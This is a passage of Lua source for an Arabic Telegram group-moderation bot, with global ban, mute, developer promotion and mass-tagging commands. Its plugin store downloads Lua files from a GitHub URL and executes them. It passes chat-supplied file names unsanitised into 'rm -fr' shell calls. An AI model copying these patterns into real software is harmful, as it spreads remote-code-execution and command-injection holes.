send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر صاصا عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(70) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر سنفوره عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1857939177) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر مبرمج جميع السورسات عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(70) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر ماديسون عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(30) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر مبرمج جميع السورسات عام")
return false 
end
database:sadd(bot_id..'GBan:User', result.sender_user_id_)
chat_kick(result.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},
function(arg,data) 
usertext = '\n◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'DV_POWER1')..')'
status  = '\n◉ تم حظره عام من جروبات'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^حظر عام @(.*)$")  and DevSoFi(msg) then
local username = text:match("^حظر عام @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local Groups = database:scard(bot_id..'Chek:Groups')  
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'◉ لا تستطيع استخدام البوت \n ◉ يرجى الاشتراك بالقناه اولا \n ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"◉ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر البوت عام")
return false 
end
if result.id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, "◉ لا يمكنك حظر المطور الاساسي \n")
return false 
end
if result.id_ == tonumber(1208165035) then
send(msg.chat_id_, msg.id_, "◉ لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(50) then
send(msg.chat_id_, msg.id_, "◉ لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber( 1744308503) then
send(msg.chat_id_, msg.id_, "◉ لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(70) then
send(msg.chat_id_, msg.id_, "◉ لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1857939177) then
send(msg.chat_id_, msg.id_, "◉ لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(70) then
send(msg.chat_id_, msg.id_, "◉ لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(30) then
send(msg.chat_id_, msg.id_, "◉ لا يمكنك حظر مبرمج السورس \n")
return false 
end
usertext = '\n◉ العضو ← ['..result.title_..'](t.me/'..(username or 'DV_POWER1')..')'
status  = '\n◉ تم حظره عام من الجروبات'
texts = usertext..status
database:sadd(bot_id..'GBan:User', result.id_)
else
texts = '◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^حظر عام (%d+)$") and DevSoFi(msg) then
local userid = text:match("^حظر عام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local Groups = database:scard(bot_id..'Chek:Groups')  
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'◉ لا تستطيع استخدام البوت \n ◉ يرجى الاشتراك بالقناه اولا \n ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if userid == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, "◉ لا يمكنك حظر المطور الاساسي \n")
return false 
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر البوت عام")
return false 
end
if tonumber(userid) == tonumber(1208165035) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(50) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber( 1744308503) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(70) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(1857939177) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(70) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(30) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع حظر مبرمج السورس عام")
return false 
end
database:sadd(bot_id..'GBan:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'DV_POWER1')..')'
status  = '\n◉ تم حظره عام من الجروبات'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n◉ العضو ← '..userid..''
status  = '\n◉ تم حظره عام من الجروبات'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("كتم عام") and msg.reply_to_message_id_ and DevSoFi(msg) then
if AddChannel(msg.sender_user_id_) == false then
local Groups = database:scard(bot_id..'Chek:Groups')  
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'◉ لا تستطيع استخدام البوت \n ◉ يرجى الاشتراك بالقناه اولا \n ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.sender_user_id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, "◉ لا يمكنك كتم المطور الاساسي \n")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع كتم البوت عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1208165035) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع كتم مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(50) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع كتم مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber( 1744308503) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع كتم مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(70) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع كتم مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1857939177) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع كتم مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(70) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع كتم مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(30) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع كتم مبرمج السورس عام")
return false 
end
database:sadd(bot_id..'Gmute:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},
function(arg,data) 
usertext = '\n◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'DV_POWER1')..')'
status  = '\n◉ تم كتمه عام من الجروبات'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^كتم عام @(.*)$")  and DevSoFi(msg) then
local username = text:match("^كتم عام @(.*)$") 
local Groups = database:scard(bot_id..'Chek:Groups')  
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'◉ لا تستطيع استخدام البوت \n ◉ يرجى الاشتراك بالقناه اولا \n ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"◉ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع كتم البوت عام")
return false 
end
if result.id_ == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, "◉ لا يمكنك كتم المطور الاساسي \n")
return false 
end
if result.id_ == tonumber(1208165035) then
send(msg.chat_id_, msg.id_, "◉ لا يمكنك كتم مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(50) then
send(msg.chat_id_, msg.id_, "◉ لا يمكنك كتم مبرمج السورس \n")
return false 
end
if result.id_ == tonumber( 1744308503) then
send(msg.chat_id_, msg.id_, "◉ لا يمكنك كتم مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(70) then
send(msg.chat_id_, msg.id_, "◉ لا يمكنك كتم مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1857939177) then
send(msg.chat_id_, msg.id_, "◉ لا يمكنك كتم مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(70) then
send(msg.chat_id_, msg.id_, "◉ لا يمكنك كتم مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(30) then
send(msg.chat_id_, msg.id_, "◉ لا يمكنك كتم مبرمج السورس \n")
return false 
end
usertext = '\n◉ العضو ← ['..result.title_..'](t.me/'..(username or 'DV_POWER1')..')'
status  = '\n◉ تم كتمه عام من الجروبات'
texts = usertext..status
database:sadd(bot_id..'Gmute:User', result.id_)
else
texts = '◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^كتم عام (%d+)$") and DevSoFi(msg) then
local userid = text:match("^كتم عام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local Groups = database:scard(bot_id..'Chek:Groups')  
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'◉ لا تستطيع استخدام البوت \n ◉ يرجى الاشتراك بالقناه اولا \n ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if userid == tonumber(SUDO) then
send(msg.chat_id_, msg.id_, "◉ لا يمكنك كتم المطور الاساسي \n")
return false 
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع كتم البوت عام")
return false 
end
if tonumber(userid) == tonumber(1208165035) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع كتم مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber( 1744308503) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع كتم مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(50) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع كتم مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(70) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع كتم مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(1857939177) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع كتم مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(70) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع كتم مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(30) then  
send(msg.chat_id_, msg.id_, "◉ لا تسطيع كتم مبرمج السورس عام")
return false 
end
database:sadd(bot_id..'Gmute:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'DV_POWER1')..')'
status  = '\n◉ تم كتمه عام من الجروبات'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n◉ العضو ← '..userid..''
status  = '\n◉ تم كتمه عام من الجروبات'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("الغاء العام") and msg.reply_to_message_id_ and DevSoFi(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'◉ لا تستطيع استخدام البوت \n ◉ يرجى الاشتراك بالقناه اولا \n ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'DV_POWER1')..')'
status  = '\n◉ تم الغاء (الحظر-الكتم) عام من الجروبات'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
database:srem(bot_id..'GBan:User', result.sender_user_id_)
database:srem(bot_id..'Gmute:User', result.sender_user_id_)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^الغاء العام @(.*)$") and DevSoFi(msg) then
local username = text:match("^الغاء العام @(.*)$") 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'◉ لا تستطيع استخدام البوت \n ◉ يرجى الاشتراك بالقناه اولا \n ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
usertext = '\n◉ العضو ← ['..result.title_..'](t.me/'..(username or 'DV_POWER1')..')'
status  = '\n◉ تم الغاء (الحظر-الكتم) عام من الجروبات'
texts = usertext..status
database:srem(bot_id..'GBan:User', result.id_)
database:srem(bot_id..'Gmute:User', result.id_)
else
texts = '◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^الغاء العام (%d+)$") and DevSoFi(msg) then
local userid = text:match("^الغاء العام (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'◉ لا تستطيع استخدام البوت \n ◉ يرجى الاشتراك بالقناه اولا \n ◉ اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'GBan:User', userid)
database:srem(bot_id..'Gmute:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'DV_POWER1')..')'
status  = '\n◉ تم الغاء (الحظر-الكتم) عام من الجروبات'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n◉ العضو ← '..userid..''
status  = '\n◉ تم حظره عام من الجروبات'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == ("مسح المطورين") and DevSoFi(msg) then
database:del(bot_id..'Sudo:User')
send(msg.chat_id_, msg.id_, "\n ◉ تم مسح قائمة المطورين  ")
end
if text == ("المطورين") and DevSoFi(msg) then
local list = database:smembers(bot_id..'Sudo:User')
t = "\n ◉ قائمة مطورين البوت \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد مطورين"
end
send(msg.chat_id_, msg.id_, t)
end

if text and text:match("^all (.*)$") or text:match("^@all (.*)$") and CoSu(msg) then 
local ttag = text:match("^all (.*)$") or text:match("^@all (.*)$") 
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then 
if database:get(bot_id.."S00F4:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then   
return  
send(msg.chat_id_, msg.id_,"انا اتخنقت منك متستنا كد😹")
end 
database:setex(bot_id..'S00F4:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(argg,dataa)  
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = dataa.member_count_},function(ta,sofi) 
x = 0 
tags = 0 
local list = sofi.members_ 
for k, v in pairs(list) do 
tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data) 
if x == 5 or x == tags or k == 0 then 
tags = x + 5 
t = "#all "..ttag.."" 
end 
x = x + 1 
tagname = data.first_name_ 
tagname = tagname:gsub("]","") 
tagname = tagname:gsub("[[]","") 
t = t..", ["..tagname.."](tg://user?id="..v.user_id_..")" 
if x == 5 or x == tags or k == 0 then 
local Text = t:gsub('#all '..ttag..',','#all '..ttag..'\n') 
sendText(msg.chat_id_,Text,0,'md') 
end 
end,nil) 
end 
end,nil) 
end,nil) 
end 
end

if text == "@all" or text == "تاك للكل" or text == "all" and CoSu(msg) then
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
if database:get(bot_id.."S00F4:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
return 
send(msg.chat_id_, msg.id_,"انا اتخنقت منك متستنا كد😹")
end
database:setex(bot_id..'S00F4:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(argg,dataa) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = dataa.member_count_},function(ta,sofi)
x = 0
tags = 0
local list = sofi.members_
for k, v in pairs(list) do
tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,data)
if x == 5 or x == tags or k == 0 then
tags = x + 5
t = "#all"
end
x = x + 1
tagname = data.first_name_
tagname = tagname:gsub("]","")
tagname = tagname:gsub("[[]","")
t = t..", ["..tagname.."](tg://user?id="..v.user_id_..")"
if x == 5 or x == tags or k == 0 then
local Text = t:gsub('#all,','#all\n')
sendText(msg.chat_id_,Text,0,'md')
end
end,nil)
end
end,nil)
end,nil)
end
end

if text == 'الملفات' and DevSoFi(msg) then
t = ' ◉ ملفات السورس الفا ↓\n ╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸ \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
t = t..i..'- الملف ← {'..v..'}\n'
end
end
send(msg.chat_id_, msg.id_,t)
end
if text == "متجر الملفات" or text == 'المتجر' then
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/MADISON11110/ALFAA/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ◉ اهلا بك في متجر ملفات الفا\n ◉ ملفات السورس ↓\n≪╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸≫\n\n"
local TextE = "\n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n ◉ علامة تعني { ✔️ } ملف مفعل\n ◉ علامة تعني { x } ملف معطل\n ◉ قناة سورس الفا ↓\n".." ◉ [اضغط هنا لدخول](t.me/so_alfaa ) \n"
local NumFile = 0
for name,Info in pairs(res.plugins_) do
local Check_File_is_Found = io.open("File_Bot/"..name,"r")
if Check_File_is_Found then
io.close(Check_File_is_Found)
CeckFile = "(✔️)"
else
CeckFile = "(x)"
end
NumFile = NumFile + 1
TextS = TextS..'*'..NumFile.."→* {`"..name..'`} ← '..CeckFile..'\n[-Information]('..Info..')\n'
end
send(msg.chat_id_, msg.id_,TextS..TextE) 
end
else
send(msg.chat_id_, msg.id_," ◉ لا يوجد اتصال من ال api \n") 
end
return false
end
end

if text and text:match("^(تعطيل) (.*)(.lua)$") and DevSoFi(msg) then
local name_t = {string.match(text, "^(تعطيل) (.*)(.lua)$")}
local file = name_t[2]..'.lua'
local file_bot = io.open("File_Bot/"..file,"r")
if file_bot then
io.close(file_bot)
t = " ◉ الملف ← "..file.."\n ◉ تم تعطيل ملف \n"
else
t = " ◉ بالتاكيد تم تعطيل ملف → "..file.."\n"
end
local json_file, res = https.request("https://raw.githubusercontent.com/MADISON11110/ALFAA/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ◉ عذرا الملف لايدعم سورس الفا \n") 
end
return false
end
if text and text:match("^(تفعيل) (.*)(.lua)$") and DevSoFi(msg) then
local name_t = {string.match(text, "^(تفعيل) (.*)(.lua)$")}
local file = name_t[2]..'.lua'
local file_bot = io.open("File_Bot/"..file,"r")
if file_bot then
io.close(file_bot)
t = " ◉ بالتاكيد تم تفعيل ملف → "..file.." \n"
else
t = " ◉ الملف ← "..file.."\n ◉ تم تفعيل ملف \n"
end
local json_file, res = https.request("https://raw.githubusercontent.com/MADISON11110/ALFAA/main/File_Bot/"..file)
if res == 200 then
local chek = io.open("File_Bot/"..file,'w+')
chek:write(json_file)
chek:close()
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ◉ عذرا الملف لايدعم سورس الفا \n") 
end
return false
end
if text == "مسح الملفات" and DevSoFi(msg) then
os.execute("rm -fr File_Bot/*")
send(msg.chat_id_,msg.id_," ◉ تم مسح الملفات")
return false
end

if text == ("رفع مطور") and msg.reply_to_message_id_ and DevSoFi(msg) then
function start_function(extra, result, success)
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Sudo:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم ترقيته مطور'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false 
end
if text and text:match("^رفع مطور @(.*)$") and DevSoFi(msg) then
local username = text:match("^رفع مطور @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⚠| عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Sudo:User', result.id_)
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم ترقيته مطور'
texts = usertext..status
else
texts = ' ◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false 
end
if text and text:match("^رفع مطور (%d+)$") and DevSoFi(msg) then
local userid = text:match("^رفع مطور (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم ترقيته مطور'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
status  = '\n ◉ تم ترقيته مطور'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and DevSoFi(msg) then
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Sudo:User', result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false 
end
if text and text:match("^تنزيل مطور @(.*)$") and DevSoFi(msg) then
local username = text:match("^تنزيل مطور @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Sudo:User', result.id_)
usertext = '\n ◉ العضو ← ['..result.title_..'](t.me/'..(username or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من المطورين'
texts = usertext..status
else
texts = ' ◉ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end  
if text and text:match("^تنزيل مطور (%d+)$") and DevSoFi(msg) then
local userid = text:match("^تنزيل مطور (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ◉ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'so_alfaa ')..')'
status  = '\n ◉ تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ◉ العضو ← '..userid..''
status  = '\n ◉ تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text == ("مسح قائمه الفا") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ◉ تم مسح قائمه الفا')
return false
end

if text == 'قائمه الفا' and Sudo(msg) then
local list = database:smembers(bot_id..'CoSu'..msg.chat_id_)
t = "\n ◉ قائمه الفا \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ◉ لا يوجد احد في قائمه الفا"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("صيح للمالك") or text == ("تاك للمالك") then
local list = database:smembers(bot_id..'CoSu'..msg.chat_id_)
t = "\n ◉ وينكم تعالو يريدوكم بالجروب \n╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- {"..v.."}\n"
end
end
if #list == 0 then
